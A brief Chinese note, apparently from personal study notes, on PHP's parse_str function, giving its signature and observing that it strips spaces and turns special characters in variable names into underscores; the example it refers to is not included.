parse_str

将字符串解析成多个变量

parse_str( string $encoded_string[, array &$result] ) : void

主要作用直接放例子（这里乱起的名字）

所以可以看出，经过parse_str的处理，会先将空格去除后，再将特殊符号替代成_

可以跑脚本fuzz一下还有哪些替代
